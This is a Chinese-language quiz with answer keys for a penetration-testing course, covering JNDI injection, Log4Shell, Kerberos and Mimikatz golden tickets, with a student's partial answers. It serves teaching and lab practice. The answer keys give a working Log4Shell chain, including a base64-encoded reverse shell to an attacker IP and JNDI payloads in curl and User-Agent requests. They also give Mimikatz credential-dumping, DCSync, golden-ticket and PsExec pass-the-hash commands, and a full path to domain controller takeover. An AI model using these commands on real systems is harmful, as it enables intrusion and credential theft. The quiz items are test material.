# 本周学习检测题（第 4 周）

> **本周核心**：JNDI 基础与注入原理 · Log4Shell 完整复现 · 域环境搭建 · Kerberos 认证协议 · 黄金票据制作 · AD 基础与信息收集 · Mimikatz 实战
> **本周完成**：JNDI 从零开始、JNDI 注入原理、Log4j2 Lookup 机制、Log4Shell 反弹 Shell、域环境搭建（DC+Win10）、Kerberos 抓包分析、黄金票据制作、AD 信息收集、Mimikatz 核心命令、PsExec 远程执行

---

## 一、选择题（每题4分，共20分）

### 第1题

关于 JNDI 的 Context 和 InitialContext，下列说法正确的是？

A. Context 是 JNDI 中存储具体数据的对象
B. InitialContext 是 JNDI 的入口，用于创建初始的命名上下文
C. lookup() 方法只能查找 RMI 协议的资源
D. JNDI 只能查找 Java 对象，不能查找其他资源

<details>
 <summary><strong>📖 查看答案</strong></summary>

**答案：B**

**解析：**
- A ❌ Context 是命名空间（一组绑定关系），不是存储具体数据的对象
- B ✅ InitialContext 是 JNDI 的入口，用来创建初始上下文
- C ❌ lookup() 支持多种协议：RMI、LDAP、DNS、CORBA 等
- D ❌ JNDI 可以查找数据源、打印机、邮件会话等多种资源

</details>

---

### 第2题

关于 JNDI 注入漏洞，下列说法正确的是？

A. JNDI 注入的根本原因是 InitialContext 初始化时参数可控
B. JNDI 注入的根本原因是 lookup() 方法的参数可控，攻击者可指定恶意的 RMI/LDAP 地址
C. JNDI 注入只能通过 RMI 协议触发，LDAP 不受影响
D. JDK 8u121 之后，JNDI 注入漏洞已被彻底修复

<details>
 <summary><strong>📖 查看答案</strong></summary>

**答案：B**

**解析：**
- A ❌ InitialContext 通常使用固定配置，漏洞点在 lookup()
- B ✅ 核心：lookup() 参数来自用户输入 → 攻击者可控制 JNDI 查询地址 → 恶意服务器返回 Reference → RCE
- C ❌ LDAP 协议同样受影响，且高版本中 LDAP 绕过方式更多
- D ❌ 只是增加了限制（trustURLCodebase=false），并未彻底修复，高版本仍有绕过方式（如 LDAP+Serialized）

</details>

---

### 第3题

关于 Log4Shell 漏洞（CVE-2021-44228），下列说法正确的是？

A. 漏洞只影响 Log4j 1.x 版本
B. 漏洞触发需要特定日志级别（如 ERROR）
C. Log4j2 的 Lookup 机制会递归解析 `${}` 包裹的表达式
D. 修复方案是升级到 Log4j 2.15.0，无需其他配置

<details>
 <summary><strong>📖 查看答案</strong></summary>

**答案：C**

**解析：**
- A ❌ 影响 Log4j 2.0-beta9 到 2.14.1
- B ❌ 与日志级别无关，只要参数被记录即触发
- C ✅ Interpolator 解析 `${}`，JndiLookup 处理 `jndi:` 前缀，触发 JNDI 查询
- D ❌ 2.15.0 默认禁用 JNDI Lookup，但最佳实践是移除 JndiLookup 类或升级到 2.17.0+

</details>

---

### 第4题

关于 Kerberos 认证协议，下列说法正确的是？

A. 用户密码在网络中明文传输
B. TGT 使用用户密码 Hash 加密
C. TGS（服务票据）使用目标服务的密码 Hash 加密
D. KDC 只负责 AS 阶段，不参与 TGS 阶段

<details>
 <summary><strong>📖 查看答案</strong></summary>

**答案：C**

**解析：**
- A ❌ 密码不传输，使用派生密钥加密时间戳
- B ❌ TGT 使用 krbtgt 账户的 Hash 加密
- C ✅ 服务票据加密：KDC 使用目标服务账户的密码 Hash 加密 TGS
- D ❌ KDC 同时承担 AS（认证服务）和 TGS（票据授予服务）两种角色

</details>

---

### 第5题

关于 Mimikatz 的黄金票据攻击，下列说法正确的是？

A. 黄金票据需要获取目标服务的 NTLM 哈希
B. 黄金票据伪造的是 TGS（服务票据）
C. 制作黄金票据需要 krbtgt 账户的 NTLM 哈希
D. 黄金票据只能伪造普通用户，不能伪造域管理员

<details>
 <summary><strong>📖 查看答案</strong></summary>

**答案：C**

**解析：**
- A ❌ 黄金票据需要 krbtgt 的哈希，白银票据才需要服务哈希
- B ❌ 黄金票据伪造的是 TGT（票据授权票据）
- C ✅ 核心：krbtgt 是 KDC 的账户，拿到其哈希即可离线伪造任意用户的 TGT
- D ❌ 可以伪造任意用户（包括域管理员）

</details>

---

## 二、简答题（每题8分，共40分）

### 第1题（JNDI 基础与注入原理）

请回答：
1. JNDI 是什么？它的核心作用是什么？（2分）
2. 写出 JNDI 查询 RMI 服务的基本代码示例。（2分）
3. 解释 JNDI 注入的攻击原理，并画出攻击流程图。（4分）

<details>
 <summary><strong>📖 查看答案</strong></summary>

**1. JNDI 定义与作用：**
- JNDI = Java Naming and Directory Interface（Java 命名和目录接口）
- 核心作用：让 Java 程序通过**名字**查找资源（对象、数据源、服务等），解耦代码与具体资源位置

**2. 代码示例：**
```java
import javax.naming.Context;
import javax.naming.InitialContext;

public class JNDIDemo {
    public static void main(String[] args) throws Exception {
        Context ctx = new InitialContext();
        Object obj = ctx.lookup("rmi://localhost:1099/MyService");
        System.out.println(obj);
        ctx.close();
    }
}
```

**3. JNDI 注入攻击原理：**

本质：lookup() 方法的参数来自用户输入，攻击者可控制 JNDI 查询地址

攻击流程图：
```
攻击者发送恶意参数
 │
 │ ldap://evil.com/Exploit
 ▼
服务端调用 ctx.lookup("ldap://evil.com/Exploit")
 │
 ▼
连接恶意 LDAP/RMI 服务器
 │
 ▼
恶意服务器返回 Reference（指向 http://evil.com/Exploit.class）
 │
 ▼
服务端下载并加载 Exploit.class
 │
 ▼
恶意类静态代码块/构造函数执行
 │
 ▼
RCE（远程代码执行）
```

</details>

---

### 第2题（Log4Shell 漏洞）

请回答：
1. Log4j2 的 Lookup 机制是什么？Interpolator 的作用是什么？（3分）
2. 写出 Log4Shell 的完整攻击链（从注入到 RCE）。（3分）
3. 为什么 DNSLog 可以用来验证 Log4Shell 漏洞是否存在？（2分）

<details>
 <summary><strong>📖 查看答案</strong></summary>

**1. Lookup 机制与 Interpolator：**
- Lookup：Log4j2 的变量替换机制，允许在日志中使用 `${变量名}` 格式动态替换为真实值
- JndiLookup：处理 jndi: 前缀的 Lookup，调用 JNDI API 查找远程对象
- Interpolator（插值器）：所有 Lookup 的调度中心，解析 `${}` 中的前缀，决定交给哪个具体 Lookup 处理

**2. Log4Shell 完整攻击链：**
```
攻击者注入 ${jndi:ldap://attacker.com/Evil}
 │
 ▼
Log4j2 记录日志，Interpolator 发现 jndi: 前缀
 │
 ▼
JndiLookup 执行 ctx.lookup("ldap://attacker.com/Evil")
 │
 ▼
连接恶意 LDAP 服务器，服务器返回 Reference（指向 http://attacker.com/Exploit.class）
 │
 ▼
目标服务器下载并加载 Exploit.class
 │
 ▼
恶意类静态代码块执行 → RCE
```

**3. DNSLog 验证原理：**

注入 `${jndi:ldap://xxx.dnslog.cn/evil}`

如果目标存在漏洞，会发起 DNS 查询请求 xxx.dnslog.cn

DNSLog 平台收到解析记录 → 证明 JNDI lookup 被执行 → 漏洞存在

无需搭建完整恶意服务，轻量快速验证

</details>

---

### 第3题（Kerberos 认证协议）

请回答：
1. Kerberos 认证的三个步骤是什么？每步的核心作用是什么？（4分）
2. TGT 和 ST 分别用什么密钥加密？为什么这样设计？（2分）
3. 什么是 PAC？它包含什么信息？（2分）

<details>
 <summary><strong>📖 查看答案</strong></summary>

**1. Kerberos 认证三步骤：**

| 步骤 | 名称 | 核心作用 |
|------|------|----------|
| 第一步 | AS_REQ / AS_REP | 用户向 KDC 认证身份，获取 TGT（票据授权票据） |
| 第二步 | TGS_REQ / TGS_REP | 用户用 TGT 向 KDC 请求访问特定服务的 ST（服务票据） |
| 第三步 | AP_REQ / AP_REP | 用户用 ST 访问目标服务，服务验证后建立连接 |

**2. 加密密钥设计：**
- TGT 加密：使用 krbtgt 账户的 Hash 加密 → 只有 KDC 能解密，用户无法伪造
- ST 加密：使用目标服务账户的 Hash 加密 → 只有目标服务能解密

设计原因：确保票据只能由预期的接收者解密，防止篡改和伪造

**3. PAC（Privilege Attribute Certificate）：**
- 特权属性证书，包含在 Kerberos 票据中
- 包含用户 SID、用户所属组 SID、用户权限信息等
- 服务通过 PAC 判断用户的访问权限

</details>

---

### 第4题（黄金票据与 Mimikatz）

请回答：
1. 什么是黄金票据？攻击原理是什么？（3分）
2. 制作黄金票据需要哪些信息？（2分）
3. 写出使用 Mimikatz 制作黄金票据并注入内存的完整命令。（3分）

<details>
 <summary><strong>📖 查看答案</strong></summary>

**1. 黄金票据定义与攻击原理：**
- 黄金票据：攻击者拿到 krbtgt 账户的 NTLM Hash 后，离线伪造的 TGT
- 攻击原理：Kerberos 认证中，KDC 用 krbtgt 的 Hash 加密 TGT。攻击者拿到 krbtgt Hash 后，可离线伪造任意用户的 TGT，KDC 无法区分真假
- 效果：获得域控访问权限，即使域管理员改了密码，只要不改 krbtgt，后门永久有效

**2. 制作黄金票据所需信息：**

| 信息 | 说明 | 获取方式 |
|------|------|----------|
| krbtgt 的 NTLM Hash | 核心密钥 | Mimikatz lsadump::dcsync /user:krbtgt |
| 域 SID | 域安全标识符 | whoami /user 或 wmic useraccount get sid |
| 域名 | 目标域名 | 如 lab.com |
| 伪造的用户名 | 任意（通常填域管理员） | 如 Administrator |

**3. Mimikatz 黄金票据命令：**
```cmd
# 1. 提权
privilege::debug

# 2. 制作黄金票据并注入内存
kerberos::golden /user:Administrator /domain:lab.com /sid:S-1-5-21-xxx-xxx-xxx /krbtgt:c42da20b5de9741b15aa6bda3027588d /ptt

# 3. 验证票据是否注入成功（退出 Mimikatz 后执行）
klist

# 4. 访问域控共享
dir \\DC01.lab.com\c$
```

</details>

---

### 第5题（域环境基础与信息收集）

请回答：
1. 域控（DC）和 Active Directory（AD）的关系是什么？（2分）
2. 用户账户和计算机账户的核心区别有哪些？（列出至少 3 点）（3分）
3. 写出至少 4 条域内信息收集命令及其作用。（3分）

<details>
 <summary><strong>📖 查看答案</strong></summary>

**1. DC 与 AD 的关系：**
- Active Directory (AD)：目录服务数据库，存储域内所有对象（用户、计算机、组、策略等）
- 域控 (Domain Controller, DC)：运行 AD DS 服务的服务器，负责认证和策略下发
- 关系：AD 是数据库，DC 是运行该数据库的服务器

**2. 用户账户 vs 计算机账户：**

| 对比项 | 用户账户 | 计算机账户 |
|--------|--------|----------|
| 命名规则 | 用户名（如 john.doe） | 计算机名 + `$`（如 WIN10$） |
| 交互式登录 | ✅ 可以 | ❌ 不能 |
| 密码管理 | 用户/管理员可改，有过期策略 | 系统自动维护（120位随机字符，自动更换） |
| 默认权限 | 普通用户权限 | 其所在计算机的本地管理员 |

**3. 域内信息收集命令：**

| 命令 | 作用 |
|------|------|
| whoami | ��看当前登录的用户和域 |
| whoami /groups | 查看当前用户的 SID 和所属组 |
| net user /domain | 查看所有域用户 |
| net group "Domain Admins" /domain | 查看域管理员组成员 |
| net group "Domain Controllers" /domain | 查看域内所有域控 |
| net group "Domain Computers" /domain | 查看所有加入域的计算机 |

</details>

---

## 三、代码/命令构造题（每题15分，共30分）

### 第1题（Log4Shell 完整复现）

请写出 Log4Shell 漏洞从搭建环境到获得反弹 Shell 的完整步骤，包括：

1. 启动恶意 JNDI 服务的命令（使用 JNDI-Injection-Exploit 或 Marshalsec）（3分）
2. 恶意类/反弹 Shell 命令的构造（含 Base64 编码）（4分）
3. 触发漏洞的 HTTP 请求（Burp 格式或 curl 命令）（4分）
4. 说明高版本 JDK（8u191+）中 LDAP+Reference 失效后的替代方案。（4分）

<details>
 <summary><strong>📖 查看答案</strong></summary>

**1. 启动恶意 JNDI 服务（使用 JNDI-Injection-Exploit）：**

```bash
# 方式一：JNDI-Injection-Exploit（自动生成恶意类）
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar \
    -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}" \
    -A 192.168.1.100

# 方式二：Marshalsec（需手动编译恶意类）
# 终端1 - 启动 HTTP 服务
python -m http.server 8080

# 终端2 - 启动 LDAP 服务
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
    marshalsec.jndi.LDAPRefServer "http://192.168.1.100:8080/#Exploit" 1389
```

**2. 反弹 Shell 命令构造：**

```bash
# 原始命令
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

# Base64 编码
echo "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" | base64
# 输出：YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==

# 最终 Payload 格式
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}
```

**3. 触发漏洞的 HTTP 请求：**

```http
POST /solr/admin/cores HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 120

action=CREATE&name=test&config=${jndi:ldap://192.168.1.100:1389/Exploit}
```

或 curl 命令：
```bash
curl -X POST http://target.com/solr/admin/cores \
    -d "action=CREATE&name=test&config=\${jndi:ldap://192.168.1.100:1389/Exploit}"
```

**4. 高版本 JDK（8u191+）绕过方案：**

| JDK 版本 | 绕过方式 | 原理 |
|--------|--------|------|
| 8u191 ~ 8u241 | LDAP + Serialized | 返回 javaSerializedData，触发本地反序列化（需 CC 链） |
| 11+ | LDAP + Serialized + JEP 290 绕过 | 需要更高阶的绕过技巧或本地 gadget |

核心原理：
```
LDAP 返回的不是 Reference，而是 javaSerializedData 属性
 ↓
客户端收到后直接调用 readObject()
 ↓
触发 CC/CB 链 → RCE
```

</details>

---

### 第2题（Mimikatz + 黄金票据）

请写出以下操作的完整命令：

1. 以管理员身份运行 Mimikatz 并提权（2分）
2. 从 LSASS 内存中抓取所有登录用户的凭证（2分）
3. 使用 DCSync 获取 krbtgt 用户的 NTLM 哈希（3分）
4. 制作黄金票据（假设域名为 lab.com，域 SID 为 S-1-5-21-xxx，krbtgt 哈希为已知），并注入内存（4分）
5. 验证黄金票据是否生效，并访问域控的 C$ 共享（4分）

<details>
 <summary><strong>📖 查看答案</strong></summary>

**1. 以管理员身份运行 Mimikatz 并提权：**

```cmd
# 以管理员身份打开 CMD
# 切换到 mimikatz 目录
mimikatz.exe

# 进入 mimikatz 后执行
privilege::debug
```

成功标志：Privilege '20' OK

**2. 抓取所有登录用户的凭证：**

```cmd
sekurlsa::logonpasswords
```

重点关注：
- msv 中的 NTLM 哈希
- wdigest 中的明文密码（如果显示）

**3. DCSync 获取 krbtgt 哈希：**

```cmd
lsadump::dcsync /domain:lab.com /user:krbtgt
```

成功标志：返回 Object RDN: krbtgt 及 Hash NTLM: xxx

**4. 制作黄金票据并注入内存：**

```cmd
kerberos::golden /user:Administrator /domain:lab.com /sid:S-1-5-21-xxx-xxx-xxx /krbtgt:c42da20b5de9741b15aa6bda3027588d /ptt
```

参数说明：

| 参数 | 说明 |
|------|------|
| /user | 要伪造的用户名（通常是域管理员） |
| /domain | 目标域名 |
| /sid | 域 SID（不含末尾的 -500） |
| /krbtgt | krbtgt 账户的 NTLM 哈希 |
| /ptt | Pass The Ticket，将票据注入当前内存 |

**5. 验证黄金票据并访问域控：**

```cmd
# 退出 Mimikatz（exit），在同一个 CMD 窗口中执行
klist

# 应该能看到伪造的 TGT 票据
# 访问域控的 C$ 共享
dir \\DC01.lab.com\c$
```

成功标志：能成功列出域控 C 盘目录，无需输入密码

</details>

---

## 四、综合分析题（10分）

**场景：** 你在渗透测试中遇到了以下环境：

- 目标 Web 应用使用 Log4j 2.14.1 记录用户请求的 User-Agent 头
- 目标 Java 版本为 JDK 8u181
- 目标内网环境，无法直接出网（DNS/HTTP 都不能直连外网）
- 你发现目标内网有一台域控 DC01.lab.com

**任务：**

1. 如何验证 Log4Shell 漏洞是否存在？（考虑内网环境无 DNSLog 的情况）（3分）
2. 验证漏洞存在后，如何获得初始 Shell？（3分）
3. 获得低权限 Web Shell 后，发现当前用户是域用户，你接下来会做什么？请写出完整的横向移动到域控的攻击路径。（4分）

<details>
 <summary><strong>📖 查看答案</strong></summary>

**1. 内网环境验证 Log4Shell：**

由于无法出网，无法使用 DNSLog。替代方案：

| 方案 | 原理 | 命令示例 |
|------|------|----------|
| 搭建内网 LDAP 服务 | 在攻击机搭建恶意 LDAP，通过响应特征判断 | java -jar JNDI-Injection-Exploit.jar -C "touch /tmp/test" -A 攻击机IP |
| 写文件探测 | 执行写文件命令，检查文件是否生成 | `${jndi:ldap://攻击机IP:1389/Exploit}` 执行 touch /tmp/log4shell_test |
| 时间延迟 | 执行耗时命令，通过响应时间判断 | `${jndi:ldap://攻击机IP:1389/Exploit}` 执行 sleep 10 |
| HTTP 回显 | 让目标请求攻击机 HTTP 服务，记录访问日志 | 使用 JNDI 工具自动托管 HTTP 服务 |

**2. 获得初始 Shell 的方法：**

```bash
# 1. 在攻击机启动监听
nc -lvnp 4444

# 2. 启动 JNDI 服务（反弹 Shell）
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar \
    -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}" \
    -A 192.168.1.100

# 3. 发送恶意请求（注入 User-Agent）
curl -H "User-Agent: \${jndi:ldap://192.168.1.100:1389/Exploit}" http://target.com/login
```

**3. 横向移动到域控的完整路径：**

```
获得低权限 Web Shell（域用户）
 │
 ▼ 1. 域内信息收集
执行：whoami、net user /domain、net group "Domain Admins" /domain
 │
 ▼ 2. 抓取内存凭证
使用 Mimikatz 或 procdump + mimikatz 抓取 lsass.dmp
目标：获取 krbtgt 哈希 或 域管理员 NTLM 哈希
 │
 ▼ 3. 制作黄金票据（如果拿到 krbtgt 哈希）
kerberos::golden /user:Administrator /domain:lab.com /sid:xxx /krbtgt:xxx /ptt
 │
 ▼ 4. 访问域控
dir \\DC01.lab.com\c$
 │
 ▼ 5. 远程执行命令（PsExec / WMI / Schtasks）
PsExec64.exe \\DC01.lab.com -s cmd.exe
 │
 ▼ 6. 在域控上抓取所有用户哈希
lsadump::lsa /patch
 │
 ▼ 7. 持久化 / 清理痕迹
```

如果未拿到 krbtgt 哈希：
```bash
# 使用 PsExec 配合抓取的域管理员哈希进行哈希传递
PsExec64.exe \\DC01.lab.com -u lab\Administrator -p "NTLM哈希" cmd.exe
```

</details>

---

## 五、附加题（挑战，10分）

**题目：**

1. 在 Kerberos 认证抓包实验中，你遇到了以下问题：抓包时只看到 TGS-REQ/TGS-REP，没有看到 AS-REQ/AS-REP。请分析可能的原因。（3分）
2. 为什么用 IP 地址访问共享（如 \\192.168.162.10\c$）不会触发 Kerberos 认证？（3分）
3. Wireshark 中如何快速定位到 AP-REQ 包？（4分）

<details>
 <summary><strong>📖 查看答案</strong></summary>

**1. 没有看到 AS-REQ/AS-REP 的原因：**

| 原因 | 说明 |
|------|------|
| 票据缓存未清除 | 本地已有有效的 TGT，直接使用缓存票据发起 TGS-REQ |
| 使用了其他认证协议 | 如 NTLM 而非 Kerberos |
| 访问时使用了 IP 而非域名 | Kerberos 依赖域名解析 |
| 连接被复用 | Windows 会复用已有连接，不重新认证 |

解决方法：
```cmd
# 清除票据缓存
klist purge

# 删除所有已建立的网络连接
net use * /delete

# 确保使用域名访问
dir \\DC01.lab.com\c$
```

**2. IP 访问不触发 Kerberos 的原因：**

Kerberos 协议依赖域名进行 SPN 解析

使用 IP 地址时，客户端无法确定目标服务的 SPN（服务主体名称）

客户端会自动降级使用 NTLM 认证

NTLM 证不会产生 AS-REQ/AS-REP/TGS-REQ/TGS-REP 等 Kerberos 包

验证方法：
```cmd
# 使用域名访问 → Kerberos
dir \\DC01.lab.com\c$

# 使用 IP 访问 → NTLM
dir \\192.168.162.10\c$
```

**3. Wireshark 定位 AP-REQ 的方法：**

| 方法 | 操作 |
|------|------|
| 方法1：SMB2 过滤 | 过滤条件 smb2，找到 Session Setup Request，查看 GSS-API 中的 OID |
| 方法2：Kerberos 过滤 | 过滤 kerberos，找 msg-type: AP-REQ (14) |
| 方法3：协议栈追踪 | 在 TGS-REP 包之后，查找同一个会话中的后续包 |
| 方法4：追踪流 | 右键任意 Kerberos 包 → Follow → TCP Stream |

AP-REQ 的特征：
- 不是独立的 Kerberos 包，而是封装在应用层协议内部
- SMB 协议：藏在 SMB2 Session Setup Request 的 Security Buffer 中
- HTTP 协议：藏在 Authorization: Negotiate 头部中

</details>

---

## 📌 附录：本周知识点速查

| 类别 | 核心知识点 | 相关题目 |
|------|----------|---------|
| JNDI | Context、InitialContext、lookup、RMI/LDAP/DNS 协议、SPI | 一.1、一.2、二.1 |
| JNDI 注入 | lookup 参数可控、Reference、trustURLCodebase | 一.2、二.1 |
| Log4Shell | Lookup 机制、JndiLookup、Interpolator、攻击链 | 一.3、二.2、三.1 |
| Kerberos | AS/TGS/AP、TGT/ST、PAC、krbtgt | 一.4、二.3、五 |
| 黄金票据 | krbtgt 哈希、TGT 伪造、Mimikatz | 一.5、二.4、三.2 |
| 域环境 | DC、AD、用户/计算机账户、OU、组策略 | 二.5 |
| 域信息收集 | net user/group、whoami | 二.5 |
| Mimikatz | privilege::debug、sekurlsa::logonpasswords、lsadump::dcsync、kerberos::golden | 一.5、三.2 |


## 答题区
### 选择题
1. B
2. B
3. C
4. C
5. C
### 简答题
#### 第一题
1. Java Naming and Directory Interface（Java命名和目录接口），用于让java程序通过名字查找资源（对象，数据源，服务等），解耦代码与具体资源位置
2. 代码示例
   ```java
   import javax.naming.Context;
   import javax.naming.InitialContext;
   public static void main(String args[]) throws Exception{
        Context ct=new initialContext();
        Objext obj=ct.lookup("rmi:127.0.0.1:1099/Exploit");
        ct.close();
   }

   ``` 
3. Lookup的参数是用户可控，用户可以指定jndi的查询地址为恶意ldap或rmi服务器，jdni会信任查询返回的Reference中的类地址，从而去加载远程恶意类
   ```
    lookup("ldap://攻击者服务器ip:1389/Exploit")
    |
    目标应用程序访问攻击者的ldap服务器查询Exploit类
    |
    攻击者服务器返回的Reference指向恶意类的url
    |
    目标应用程序按照返回的url去请求并加载恶意类
    |
    执行静态代码块/构造函数
    |
    RCE
   ``` 
#### 第二题
1. 允许在日志中使用模版字符串格式，Lookup会提取模版${}中的字符串并根据该字符串查找资源将其解析为真值；Interpolator根据前缀调用特定 API 的lookup比如："jndi:....."就会调用jndilookup
2. 调用链
   ```
    攻击者输入${jdni:ldap://攻击者服务器:1389/Exploit}
    |
    目标应用程序Log4j记录日志，解析模板字符串
    |
    Inyerpolator根据jndi选择调用JndiLookup解析变量
    |
    目标应用程序执行lookup("ldap://攻击者服务器:1389/Exploit")
    |
    访问恶意ldap服务器
    |
    恶意ldap服务器返回Reference指向任意类地址
    |
    应用程序请求Reference中的地址并加载恶意类
    |
    执行静态代码块/构造函数
    |
    RCE
   ``` 
3. 当无回显时，攻击者通过输入特定模版字符串让目标应用程序"ping 攻击者控制的域名",然后DNSlog平台就会出现解析记录，攻击者发现有解析记录就说RCE成功就可以证明存在漏洞

#### 第三题
1. 步骤
    ```
    1. 用户账户请求tgt通票，KDC检查该账户是否进行预认证，给通过与认证的账户返回用krbtgt账号的密码哈希加密的TGT票据
    2. 用户账户携带刚刚的TGT票据向KDC请求ST，KDC验证后返回目标服务账户的密码哈希加密的ST票据
    3. 用户携带ST票据访问目标服务，目标服务建议ST票据通过后给用户返回资源
    ```
2. TGT用krbtgt账户的密码哈希加密，ST用目标服务的账户密码哈希加密
3. 